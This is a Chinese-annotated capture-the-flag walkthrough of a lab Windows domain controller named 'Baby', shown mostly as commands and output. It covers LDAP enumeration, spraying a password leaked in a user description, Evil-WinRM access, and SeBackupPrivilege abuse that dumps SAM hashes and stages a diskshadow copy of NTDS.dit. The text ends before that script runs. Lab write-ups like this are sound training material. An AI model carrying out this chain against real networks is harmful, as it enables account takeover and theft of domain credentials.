## Baby
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-11 10:57:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-11T10:57:55+00:00; -4s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-11T10:57:15+00:00
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-08-18T12:14:43
|_Not valid after:  2026-02-17T12:14:43
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
```
[★]$ echo '10.129.3.97 baby.vl BabyDC.baby.vl' | sudo tee -a /etc/hosts
10.129.3.97 baby.vl BabyDC.baby.vl
```
### LDAP 
#### 枚举到了域内的用户账号：sAMAccountName 是 Windows/AD 中的登录名
```
[★]$ ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl | grep sAMAccountName
sAMAccountName: Guest
sAMAccountName: Jacqueline.Barnett
sAMAccountName: Ashley.Webb
sAMAccountName: Hugh.George
sAMAccountName: Leonard.Dyer
sAMAccountName: Connor.Wilkinson
sAMAccountName: Joseph.Hughes
sAMAccountName: Kerry.Wilson
sAMAccountName: Teresa.Bell
```
#### 提取用户名
```
[★]$ ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl | grep '^sAMAccountName:' | awk -F': ' '{print $2}' > users.txt

[★]$ cat users.txt
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
```
#### 与其他用户的区别在于decription初始密码
```
[★]$ ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl
<SNIP>
# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
```
#### description: Set initial password to BabyStart123!非常重要 — 描述字段直接写了初始密码 BabyStart123!
```
[★]$ nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
SMB         10.129.3.97     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Guest:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123!
```
#### 枚举用户名没有成功！

### Foothold
#### 将搜索域上的所有对象，同时使用grep只查看对象的对象名字
```
[★]$ ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://BabyDC.baby.vl | grep dn
dn: DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```
#### 去重并追加新的用户名
```
[★]$ cat >> users.txt <<'EOF'
> Ian.Walker
> Caroline.Robinson
> EOF
[★]$ cat users.txt
Guest
Hugh.George
Jacqueline.Barnett
Joseph.Hughes
Kerry.Wilson
Leonard.Dyer
Teresa.Bell
Ian.Walker
Caroline.Robinson
```
#### 最后一行的[]是紫色的,密码已过期（必须修改）的明确标志
```
[★]$ nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
SMB         10.129.3.97     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Guest:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123!
LDAP        10.129.3.97     389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```
#### 将旧的密码BabyStart123!改为自定义的密码NewPass123
```
[★]$ smbpasswd -U BABY/caroline.robinson -r baby.vl
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user caroline.robinson
```
#### 将尝试使用Evil-WinRM登录该帐户
```
[★]$ evil-winrm -i baby.vl -u caroline.robinson -p NewPass123
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>
```
### Privilege Escalation
```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
#### 破解SeBackupPrivilege会泄漏重要信息
#### 更具体地说，我们将需要SAM和SYSTEM蜂巢。SAM存储本地帐户元数据和机器上本地用户的散列凭据（NTLM散列）。而SYSTEM则包含信息需要获得解密SAM hive所需的引导密钥。我们将首先在当前目录中创建备份
```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam .\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system .\system
The operation completed successfully.
```
#### 现在我们可以使用Evil-WinRM的下载函数将它们下载到本地机器上。
```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download sam
                                        
Info: Downloading C:\Users\Caroline.Robinson\Documents\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download system
                                        
Info: Downloading C:\Users\Caroline.Robinson\Documents\system to system
                                        
Info: Download successful!
```
#### 现在我们可以使用impacket的secretdump工具来提取用户哈希值。
```
[★]$ ls
sam  system  users.txt

[★]$ impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```
#### 然而，尝试使用这个管理员哈希8d992faed38128ae85e95fa35868bb43登录证明成功。
#### 我们的下一步将是尝试转储域哈希。为了做到这一点，我们将需要NTDS.dit数据库，其中包含Active Directory域对象和凭据。但是，活动文件被锁定并且我们不能直接复制它。因此，我们必须创建当前卷的卷影副本或快照使用diskshadow驱动器。然后我们将能够暴露复制的驱动器并访问NTDS.dit文件，因为它没有被使用。系统蜂巢，我们已经有将提供必要的关键，我们需要解密其内容。
#### 因此，我们将使用以下脚本，我们将上传到受害机器并命名为backup.txt。这将创建C：驱动器的持久影子副本，并以别名cdrive挂载快照到驱动器E：。
```
[★]$ vi backup.txt
[★]$ cat backup.txt
set verbose on 
set metadata C:\Windows\Temp\test.cab
set context persistent
add volume C: alias cdrive
create
expose %cdrive% E:
```
#### 上传
```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload backup.txt
                                        
Info: Uploading /home/syareya55/Baby/backup.txt to C:\Users\Caroline.Robinson\Documents\backup.txt
                                        
Data: 172 bytes of 172 bytes copied
                                        
Info: Upload successful!
```
#### 现在我们可以在使用diskshadow的机器上运行脚本了。


